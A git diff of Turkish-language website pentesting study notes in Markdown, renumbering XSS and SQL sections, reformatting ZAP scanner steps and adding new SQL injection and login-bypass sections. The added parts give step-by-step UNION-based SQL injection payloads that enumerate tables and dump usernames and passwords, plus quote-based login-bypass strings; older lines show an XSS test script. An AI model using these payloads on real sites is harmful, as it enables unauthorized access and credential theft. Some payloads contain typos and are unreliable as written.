@@ -88,13 +88,13 @@
   - [Weevely](#Weevely)
   - [File Inclusion](#File-Inclusion)
   - [Nikto](#Nikto)
-- [XSS](#XSS)
+- [21-XSS](#21-XSS)
   - [XSS Açıkları](#Xss-Açıkları)
   - [XSS Reflected](#XSS-Reflected)
   - [XSS Stored](#XSS-Stored)
     - [XSS Stored ve Beef Çalıştırma](#XSS-Stored-ve-Beef-Çalıştırma)
   - [XSSden Korunmak İçin](#XSSden-Korunmak-İçin)
-- [SQL](#SQL)
+- [22-SQL](#22-SQL)
   - [SQL Kodları](#SQL-Kodları)
   - [SQL ile Database Görme](#SQL-ile-Database-Görme)
   - [Mutillidae İçinde SQL Hatası](#Mutillidae-İçinde-SQL-Hatası)
@@ -822,11 +822,11 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
   
 ```nikto -h (site URL'si) ``` site ile ilgili tarama yapar  
 
-# XSS Açıkları
+# 21-XSS
   
 XSS açıkları site içinde JS kodu çalıştırabiliyoruz demektir
 
-### XSS
+### XSS Açıkları
   
 1. Site ile etkileşime girebileceğimiz bir yere giriyoruz (form vb.)
 2. ```<script>alert("XSS Açığı")</script>``` kodunu yazarak deneme yapıyoruz
@@ -875,7 +875,7 @@ Google -> Ayarlar -> Gizlilik ve Güvenlik -> Site Ayarları -> JavaScript
 
 Varsayılan durumunu kapatıp sadece güvendiğimiz siteleri listeye eklemeliyiz
 
-# SQL
+# 22-SQL
 
 [sqliteonline.com](https://sqliteonline.com/) sitesinden SQL kodlarını deneyebiliriz
   
@@ -1003,18 +1003,46 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d326716448fe5caa031175c9d6ac65a8dc08b1fb/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.34.27.jpeg)
 
 # ZAP Bir Çeşit Açık Bulma Programı 
-#### 1. Zap uygulamasını açıyoruz
+
+1. Zap uygulamasını açıyoruz
+
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/zap.jpeg)
-#### 2. ```Scan Policy Manager``` kısımından ```XSS'mi yoksa SQL'mi``` seçebiliriz
+
+2. ```Scan Policy Manager``` kısımından ```XSS'mi yoksa SQL'mi``` seçebiliriz
+
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/scan%20policy.jpeg)
-#### 3. Sitenin URL'sini yapıştırıp ```active scan'i ekliyoruz (sol altta bulunan yeşil artıdan)``` ve attack diyoruz
-#### 4. ```Alert``` kısımından açık türlerini görebiliriz
+
+3. Sitenin URL'sini yapıştırıp ```active scan'i ekliyoruz (sol altta bulunan yeşil artıdan)``` ve attack diyoruz
+4. ```Alert``` kısımından açık türlerini görebiliriz
+
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/alerts.jpeg)
-#### 5. Açığa tıklayıp ```response``` seçersek o açığı ele geçirmek için gerekli teknik bilgileri görebiliriz
+
+5. Açığa tıklayıp ```response``` seçersek o açığı ele geçirmek için gerekli teknik bilgileri görebiliriz
+
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/response.jpeg)
-#### 6. ```Alert``` kısımındaki açığa sağ tıklayarak o sayfaya gidebiliriz
+
+6. ```Alert``` kısımındaki açığa sağ tıklayarak o sayfaya gidebiliriz
+
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/open%20url.jpeg)
-#### 7. ```Kırmızı bayrak``` yüksek riskli, ```Sarı bayrak``` düşük riskli demektir
 
+7. ```Kırmızı bayrak``` yüksek riskli, ```Sarı bayrak``` düşük riskli demektir
 
+# SQL Enjeksiyonu
+
+1. Sitenin URL'sinde ```...?id=1``` varsa URL'ye ```...?#id=1 OR 1=1``` çalıştırmayı deniyoruz, eğer aynı site çıkıyorsa doğru yoldayız demektir
+2. ```...?id=1 OR 1=1 order by 9``` deneyerek kaç sütun olduğunu anlamaya çalışıyoruz. 9 yerine başka sayılar koyup tek tek deniyoruz
+3. Örneğin 11 sütun var. ```...?id=1 OR 1=1 union select 1,2,3,4,5,6,7,8,9,10,11``` yazıyoruz
+4. Sayfa içinde bir yerde bozukluk buluyoruz. Örneğin 2. sütunda bozukluk var.
+5. ```...?id=1 OR 1=1 unioun select 1,database(),3,4,5,6,7,8,9,10,11``` yazarak bozukluk olan yerden ```veritabanı ismini``` öğrenebiliriz
+6. ```...?id=1 OR 1=1 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=database()``` yazarak tablo isimini öğrenebiliriz
+7. ```...?id=1 OR 1=1 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name=0x7573657273(users tablosunun hex hali)``` isimleri hex'e çevirmek için google'a ```text to hex``` yazabiliriz
+8. ```...?id=1 OR 1=1 union select 1,group_concat(unme,0x3a,pass),3,4,5,6,7,8,9,10,11 from users``` kullanıcı isimlerini ve şifreleri öğrenebiliriz (0x3a kullanıcı adı ve şifre arasına ":" koyar)
+
+# Login By-Pass
+
+1. Login kısımının URL adresinde SQL açığı varsa 
+
+| Kullanıcı Adı | ' or "=" |
+| --- | --- |
+| Şifre | ' or "=" | 
 
